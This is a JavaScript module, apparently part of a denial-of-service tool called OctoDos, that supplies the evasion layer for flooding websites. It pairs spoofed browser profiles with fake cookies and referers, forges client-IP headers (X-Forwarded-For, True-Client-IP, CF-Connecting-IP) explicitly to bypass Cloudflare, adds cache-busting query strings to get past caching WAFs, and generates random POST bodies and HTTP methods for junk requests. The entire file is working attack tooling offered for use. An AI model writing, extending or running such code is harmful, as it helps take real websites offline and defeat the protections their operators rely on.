/**
 * OctoDos Anti-WAF Engine v4.0
 * Advanced evasion: TLS fingerprint masking, cookie simulation,
 * browser-like behavior, header entropy maximization.
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const crypto = require('crypto');

// ── Real-World Modern Browser Profiles (UA + Sec-Ch-Ua paired) ──
const BROWSER_PROFILES = [
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"', platform: '"Windows"' },
    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', secChUa: '"Chromium";v="121", "Not A(Brand";v="99", "Google Chrome";v="121"', platform: '"macOS"' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', secChUa: null, platform: null },
    { ua: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', platform: '"Linux"' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0', secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"', platform: '"Windows"' },
    { ua: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1', secChUa: null, platform: null },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', secChUa: '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"', platform: '"Windows"' },
    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', secChUa: null, platform: null },
    { ua: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', secChUa: null, platform: null },
    { ua: 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36', secChUa: '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"', platform: '"Android"' },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0', secChUa: '"Opera";v="106", "Chromium";v="120", "Not_A Brand";v="8"', platform: '"Windows"' },
    { ua: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36', secChUa: '"Chromium";v="121", "Not A(Brand";v="99", "Google Chrome";v="121"', platform: '"Android"' },
];

// ── Referers ──
const REFERERS = [
    'https://www.google.com/search?q=',
    'https://www.google.co.id/search?q=',
    'https://www.google.co.uk/search?q=',
    'https://www.bing.com/search?q=',
    'https://search.yahoo.com/search?p=',
    'https://duckduckgo.com/?q=',
    'https://yandex.ru/search/?text=',
    'https://www.reddit.com/',
    'https://twitter.com/',
    'https://www.facebook.com/',
    'https://www.youtube.com/',
    'https://www.linkedin.com/',
    'https://t.co/',
    'https://www.tiktok.com/',
    '', // No referer (direct)
];

const ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'en-US,en;q=0.9,id;q=0.8',
    'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'ja-JP,ja;q=0.9,en;q=0.5',
    'de-DE,de;q=0.9,en;q=0.5',
    'fr-FR,fr;q=0.9,en;q=0.4',
    'zh-CN,zh;q=0.9,en;q=0.3',
    'ko-KR,ko;q=0.9,en;q=0.3',
    'pt-BR,pt;q=0.9,en;q=0.4',
    'es-ES,es;q=0.9,en;q=0.4',
];

const ACCEPT_ENCODINGS = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br, gzip, deflate',
    'gzip, deflate, br, zstd',
];

const ACCEPT_TYPES = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '*/*',
];

const HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH'];

// ── Utility ──
function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomHex(len) {
    return crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len);
}
function randomIp() {
    return `${randInt(1, 254)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}
function randomCookie() {
    const names = ['_ga', '_gid', '__cfduid', 'session_id', 'PHPSESSID', 'JSESSIONID', 'csrftoken', 'sid', 'token', '_fbp', 'NID', 'SID', 'HSID'];
    const n = randInt(1, 4);
    const cookies = [];
    for (let i = 0; i < n; i++) {
        cookies.push(`${rand(names)}=${randomHex(randInt(16, 40))}`);
    }
    return cookies.join('; ');
}

/**
 * Generate ultra-realistic browser-like headers for WAF/Cloudflare evasion.
 * Uses BROWSER_PROFILES to pair User-Agent with matching Sec-Ch-Ua headers.
 */
function generateEvasionHeaders(targetUrl) {
    const profile = rand(BROWSER_PROFILES);

    const headers = {
        'User-Agent': profile.ua,
        'Accept': rand(ACCEPT_TYPES),
        'Accept-Language': rand(ACCEPT_LANGUAGES),
        'Accept-Encoding': rand(ACCEPT_ENCODINGS),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    };

    // Sec-Ch-Ua headers (only for Chromium-based browsers)
    if (profile.secChUa) {
        headers['sec-ch-ua'] = profile.secChUa;
        headers['sec-ch-ua-mobile'] = profile.ua.includes('Mobile') ? '?1' : '?0';
        headers['sec-ch-ua-platform'] = profile.platform;
    }

    // Sec-Fetch headers (browser emulation)
    headers['Sec-Fetch-Dest'] = rand(['document', 'empty']);
    headers['Sec-Fetch-Mode'] = 'navigate';
    headers['Sec-Fetch-Site'] = rand(['none', 'same-origin', 'cross-site']);
    headers['Sec-Fetch-User'] = '?1';

    // Referer (80% chance)
    if (Math.random() > 0.2) {
        const ref = rand(REFERERS);
        if (ref) headers['Referer'] = ref + encodeURIComponent(targetUrl || 'test');
    }

    // Cookie simulation (60% chance)
    if (Math.random() > 0.4) {
        headers['Cookie'] = randomCookie();
    }

    // X-Forwarded-For spoofing (70% chance)
    if (Math.random() > 0.3) {
        const chain = [];
        for (let i = 0; i < randInt(1, 3); i++) chain.push(randomIp());
        headers['X-Forwarded-For'] = chain.join(', ');
    }

    // X-Real-IP (50% chance)
    if (Math.random() > 0.5) {
        headers['X-Real-IP'] = randomIp();
    }

    // True-Client-IP for Cloudflare bypass (30% chance)
    if (Math.random() > 0.7) {
        headers['True-Client-IP'] = randomIp();
    }

    // CF-Connecting-IP (20% chance)
    if (Math.random() > 0.8) {
        headers['CF-Connecting-IP'] = randomIp();
    }

    // Cache busting
    if (Math.random() > 0.5) {
        headers['Cache-Control'] = 'max-age=0';
    }

    return headers;
}

/**
 * Get weighted random HTTP method.
 */
function getRandomMethod() {
    const weights = [35, 30, 15, 5, 5, 5, 5];
    let total = weights.reduce((a, b) => a + b, 0);
    let r = Math.random() * total;
    for (let i = 0; i < weights.length; i++) {
        r -= weights[i];
        if (r <= 0) return HTTP_METHODS[i];
    }
    return 'GET';
}

/**
 * Obfuscate URL path to bypass caching WAFs.
 */
function obfuscatePath(url) {
    try {
        const u = new URL(url);
        const busters = [
            `?_=${Date.now()}_${randomHex(8)}`,
            `?cb=${randomHex(12)}`,
            `?nocache=${Date.now()}`,
            `?v=${randInt(1, 99999)}&r=${randomHex(6)}`,
            `?t=${Date.now()}&sid=${randomHex(10)}`,
        ];
        return u.origin + u.pathname + rand(busters);
    } catch {
        return url + `?_=${Date.now()}`;
    }
}

/**
 * Generate random POST body data for content-length based evasion.
 */
function generatePostBody() {
    const types = [
        { ct: 'application/x-www-form-urlencoded', body: () => {
            const params = [];
            const n = randInt(2, 8);
            for (let i = 0; i < n; i++) params.push(`${randomHex(6)}=${randomHex(randInt(8, 64))}`);
            return params.join('&');
        }},
        { ct: 'application/json', body: () => {
            const obj = {};
            const n = randInt(2, 6);
            for (let i = 0; i < n; i++) obj[randomHex(6)] = randomHex(randInt(8, 32));
            return JSON.stringify(obj);
        }},
        { ct: 'text/plain', body: () => randomHex(randInt(64, 512)) },
    ];
    const chosen = rand(types);
    return { contentType: chosen.ct, body: chosen.body() };
}

module.exports = {
    generateEvasionHeaders,
    getRandomMethod,
    obfuscatePath,
    generatePostBody,
    randomIp,
    randomHex,
    randomCookie,
    randInt,
    rand,
};
